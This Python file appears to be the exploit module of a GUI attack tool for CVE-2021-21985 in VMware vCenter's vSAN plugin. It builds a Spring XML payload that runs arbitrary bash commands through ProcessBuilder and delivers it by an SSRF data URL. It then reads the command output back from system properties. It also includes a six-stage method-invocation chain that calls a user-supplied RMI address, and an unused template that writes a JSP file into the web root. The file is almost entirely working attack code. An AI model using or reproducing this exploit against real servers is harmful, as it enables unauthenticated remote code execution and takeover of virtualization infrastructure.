import json
import os
import base64
import urllib3
import zipfile
import requests
from utils.output import *

urllib3.disable_warnings()

class cve_2021_21985_exploit:

    def __init__(self, url_text, result_text, update_date, command_text, rmi_text):
        _url = str(url_text.text())
        if _url.endswith("/"):
            self.url = _url[:-1]
        else:
            self.url = _url
        self.result_text = result_text
        self.update_date = update_date
        self.cmd = command_text.toPlainText()
        self.header = {
                "Accept": "*/*",
                "Content-Type": "application/json"
        }
        self.rmi = rmi_text.text()

    def delete_file(self):
        if os.path.isfile("offline_bundle.xml"):
            os.remove("offline_bundle.xml")
        else:
            pass
        if os.path.isfile("offline_bundle.zip"):
            os.remove("offline_bundle.zip")
        else:
            pass

    def create_xml(self):
        self.delete_file()
        self.update_date.emit(output_format("INFO", "Start creating Xml to <offline_bundle.xml> ..."))
        command_context = """<beans xmlns="http://www.springframework.org/schema/beans"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xsi:schemaLocation="
         http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder">
            <constructor-arg>
              <list>
                <value>/bin/bash</value>
                <value>-c</value>
                <value><![CDATA[ {cmd} 2>&1 ]]></value>
              </list>
            </constructor-arg>
        </bean>
        <bean id="is" class="java.io.InputStreamReader">
            <constructor-arg>
                <value>#{pb.start().getInputStream()}</value>
            </constructor-arg>
        </bean>
        <bean id="br" class="java.io.BufferedReader">
            <constructor-arg>
                <value>#{is}</value>
            </constructor-arg>
        </bean>
        <bean id="collectors" class="java.util.stream.Collectors"></bean>
        <bean id="system" class="java.lang.System">
            <property name="whatever" value="#{ system.setProperty(&quot;output&quot;, br.lines().collect(collectors.joining(&quot;\n&quot;))) }"/>
        </bean>
    </beans>
""".replace("{cmd}", self.cmd)
        getshell_context = """<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.io.PrintWriter">
        <constructor-arg>
            <value>/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/41/0/h5ngc.war/resources/log2.jsp</value>
        </constructor-arg>
    </bean>
    <bean id="is" class="java.lang.String">
        <constructor-arg>
            <value><![CDATA[<% out.println("ok"); %> ]]></value>
        </constructor-arg>
        <property name="whatever" value="#{ pb.println(is).close()}"/>
    </bean>
</beans>"""
        with open('offline_bundle.xml', 'w') as wf:
            wf.write(command_context)
            wf.flush()
        self.update_date.emit(output_format("SUCCESS", "Create Xml to <offline_bundle.xml> successfully!"))

    def create_zip(self):
        self.update_date.emit(output_format("INFO", "Start creating zip to <offline_bundle.zip> ..."))
        with zipfile.ZipFile('offline_bundle.zip', 'w', zipfile.ZIP_DEFLATED) as zp:
            zp.write('offline_bundle.xml')
        self.update_date.emit(output_format("SUCCESS", "Create zip to <offline_bundle.zip> successfully!"))

    def zip2Base64(self):
        with open('offline_bundle.zip', 'rb') as rf:
            return base64.b64encode(rf.read())

    def postXml2SystemProperties(self):
        try:
            ssrf_str = "https://localhost:443/vsanHealth/vum/driverOfflineBundle/data:text/html%3Bbase64,{}%23"
            ssrf = ssrf_str.format(bytes.decode(self.zip2Base64()))
            self.update_date.emit(output_format("INFO", "Start posting xml to SystemProperties ..."))
            target_url = self.url + "/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages"
            data = {"methodInput": [[ssrf]]}
            resp = requests.post(target_url, json=data, headers=self.header, verify=False)
            if "{\"error\"" in str(resp.text):
                self.update_date.emit(output_format("FAILED", f"Error message: {resp.json()['error']}"))
            else:
                self.update_date.emit(output_format("SUCCESS", "Post xml to SystemProperties successfully!"))
        except:
            self.update_date.emit(output_format("FAILED", "Failed to post xml to SystemProperties."))

    def getProperty(self):
        try:
            target_url = self.url + "/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty"
            data = {"methodInput": ["output", None]}
            r = requests.post(target_url, json=data, headers=self.header, verify=False)
            if "{\"error\"" in str(r.text):
                self.update_date.emit(output_format("ERROR", f"During the execution of the command, an error occurred. Error message: {r.json()['error']}"))
            elif "{\"result\"" in str(r.text):
                self.update_date.emit(output_format("SUCCESS", f"The execution result of {self.cmd} is as follows:\n{r.json()['result']}"))
            else:
                self.update_date.emit(output_format("FAILED", f"Command execution failed. Please check the network and try again or attempt manual exploitation."))
        except Exception as e:
            self.update_date.emit(output_format("ERROR", f"Command execution result query failed. Error message:{str(e)}."))

    def check_false(self, request_text):
        if '{"result' not in request_text:
            return True
        else:
            return False

    def rmi_attack(self):
        base_uri = "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService"
        uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
        # first stage
        self.update_date.emit(output_format("INFO", "Start to init TargetObject..."))
        stage_setTargetObject = json.loads('{"methodInput":[null]}')
        req1 = requests.post(url=self.url + base_uri + uris[0], json=stage_setTargetObject, headers=self.header, verify=False)
        if self.check_false(req1.text):
            self.update_date.emit(output_format("FAILED", "Failed to init TargetObject."))
        else:
            self.update_date.emit(output_format("SUCCESS", "Init TargetObject successfully!"))

        # second stage
        self.update_date.emit(output_format("INFO", "Start to set static method..."))
        stage_setStaticMethod = {"methodInput": ["java.lang.Class.forName"]}
        req2 = requests.post(url=self.url + base_uri + uris[1], json=stage_setStaticMethod, headers=self.header, verify=False)
        if self.check_false(req2.text):
            self.update_date.emit(output_format("FAILED", "Failed to init StaticMethod."))
        else:
            self.update_date.emit(output_format("SUCCESS", "Init StaticMethod successfully!"))

        # third stage
        self.update_date.emit(output_format("INFO", "Start to set target method..."))
        stage_setTargetMethod = {"methodInput": ["getMethod"]}
        req3 = requests.post(url=self.url + base_uri + uris[2], json=stage_setTargetMethod, headers=self.header, verify=False)
        if self.check_false(req3.text):
            self.update_date.emit(output_format("FAILED", "Failed to set target method."))
        else:
            self.update_date.emit(output_format("SUCCESS", "Set target nethod successfully!"))

        # forth stage
        self.update_date.emit(output_format("INFO", "Start to set arguments..."))
        stage_setArguments = {"methodInput": [["%s" % self.rmi]]}
        req4 = requests.post(url=self.url + base_uri + uris[3], json=stage_setArguments, headers=self.header, verify=False)
        if self.check_false(req4.text):
            self.update_date.emit(output_format("FAILED", "Failed to set arguments."))
        else:
            self.update_date.emit(output_format("SUCCESS", "Set arguments successfully!"))

        # fifth stage
        self.update_date.emit(output_format("INFO", "Start to prepare..."))
        stage_prepare = {"methodInput": []}
        req5 = requests.post(url=self.url + base_uri + uris[4], json=stage_prepare, headers=self.header, verify=False)
        if self.check_false(req5.text):
            self.update_date.emit(output_format("FAILED", "Failed to prepare."))
        else:
            self.update_date.emit(output_format("SUCCESS", "Prepare successfully!"))

        # sixth stage
        self.update_date.emit(output_format("INFO", "Start to invoke..."))
        stage_invoke = {"methodInput": []}
        req5 = requests.post(url=self.url + base_uri + uris[5], json=stage_invoke, headers=self.header, verify=False)
        if self.check_false(req5.text):
            self.update_date.emit(output_format("FAILED", "Failed to invoke."))
        else:
            self.update_date.emit(output_format("SUCCESS", "Invoke successfully!"))

    def exploit(self):
        if (self.rmi == "" and self.cmd == "") or (self.rmi != "" and self.cmd != ""):
            self.update_date.emit(output_format("ERROR", f"You must choose either rmi or command, not both!."))
        else:
            if self.rmi == "":
                self.create_xml()
                self.create_zip()
                self.postXml2SystemProperties()
                self.getProperty()
                self.delete_file()
            else:
                try:
                    self.rmi_attack()
                except Exception as e:
                    self.update_date.emit(output_format("ERROR", f"RMI exploitation has failed, please check your network and try again, or attempt manual exploitation. Error message: {str(e)}."))